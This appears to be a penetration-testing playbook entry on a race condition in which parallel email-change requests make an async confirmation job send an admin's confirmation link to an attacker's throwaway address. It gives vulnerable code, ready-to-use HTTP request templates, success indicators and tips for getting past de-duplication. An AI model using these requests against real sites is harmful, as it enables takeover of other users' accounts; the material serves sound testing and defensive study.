# Single-Endpoint Collision (Email Change / Async Job Confusion)

## When this applies

- Endpoint queues an async job (email send, password reset, webhook fire) that reads its data from the DB AFTER the request returns.
- Two parallel requests update the same record. The async job for request 1 reads record state set by request 2.
- Goal: trick the async job into sending sensitive data (confirmation email, password reset link) to the wrong recipient.

## Technique

Send two parallel requests that update the same record but reference different downstream effects. The first request enqueues a job whose payload is fetched lazily; the second request rewrites the record before the job runs.

**Vulnerable Code:**
```python
async def send_confirmation(user_id, new_email):
    user = get_user(user_id)  # Race window!
    send_email(user.email, token)
```

**Attack Pattern:**
```
Parallel:
  - POST /change-email (email=throwaway)
  - POST /change-email (email=admin)
```

**Success Signature:** Confirmation to throwaway contains admin link.

## Steps

### Request templates

```http
# Request 1: Throwaway email
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

email=throwaway@attacker.com

# Request 2: Target admin email
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

email=admin@target.com
```

### Exploitation

- Both requests queue async email tasks
- Task retrieves data from database (race window)
- Confirmation sent to throwaway@ contains admin@ link

### Success indicator

```
Email To: throwaway@attacker.com
Link: /confirm?token=ABC&email=admin@target.com
```

## Verifying success

- The email recipient and the email content reference DIFFERENT users/values.
- Confirmation token works against the user it references in the body, not the recipient address.
- Audit logs show one user_id with both email values logged in quick succession.

## Common pitfalls

- Mail servers de-duplicate identical messages — vary the request slightly so the queue retains both.
- Some queues snapshot the data at enqueue time (immune to this attack); test with two distinct endpoints if needed.
- Catch-all email (Mailosaur, mail.tm) helps observe BOTH messages and tokens.

## Tools

- Burp Turbo Intruder (multi-request single-packet)
- Catch-all email service (Mailosaur, mail.tm)
- Burp Collaborator (out-of-band confirmation)
